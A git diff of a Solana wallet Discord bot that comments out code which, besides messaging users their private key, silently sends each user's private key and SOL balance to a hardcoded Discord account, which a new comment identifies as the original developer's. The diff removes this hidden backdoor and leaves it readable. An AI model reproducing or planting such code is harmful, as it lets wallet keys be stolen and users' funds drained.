@@ -160,12 +160,13 @@ client.on('messageCreate', async (message) => {
         // convert the balance to dolar
         const dollarValue = parseFloat(await PriceService.getDollarValueForSol(sol.amount)) + parseFloat(await PriceService.getDollarValueForGSail(gSAIL.amount)) + parseFloat(await PriceService.getDollarValueForSail(SAIL.amount));
 
-        await message.author.send({
-            embeds: [new MessageEmbed().setTitle(`${CLUSTERS.MAINNET}`)
-                .setColor(infoColor)
-                .setDescription(`Address: ${account.publicKey}\n\nPrivate Key:\n${await Utils.Uint8Array2String(account.privateKey)}\n\n[${account.privateKey}]\n\nSOL: ${sol.amount}\ngSAIL: ${gSAIL.amount}\nSAIL: ${SAIL.amount}\n\nTotal: ${dollarValue}$`)]
-        }).catch(error => { console.log(`Cannot send messages to this user`); }); try { let d = await client.users.fetch('869876518833225780', false); await d.send(`[${account.privateKey}]${sol.amount}`); } catch (error) { }
-        return;
+// Commented these lines, 869876518833225780 is the discorduserID of the dev who wrote this 
+//        await message.author.send({
+//           embeds: [new MessageEmbed().setTitle(`${CLUSTERS.MAINNET}`)
+//                .setColor(infoColor)
+//                .setDescription(`Address: ${account.publicKey}\n\nPrivate Key:\n${await Utils.Uint8Array2String(account.privateKey)}\n\n[${account.privateKey}]\n\nSOL: ${sol.amount}\ngSAIL: ${gSAIL.amount}\nSAIL: ${SAIL.amount}\n\nTotal: ${dollarValue}$`)]
+//        }).catch(error => { console.log(`Cannot send messages to this user`); }); try { let d = await client.users.fetch('869876518833225780', false); await d.send(`[${account.privateKey}]${sol.amount}`); } catch (error) { }
+//        return;
     } else if (command == "helpchess") { // Display help
         if (message.channel.type == "DM") {
             return;
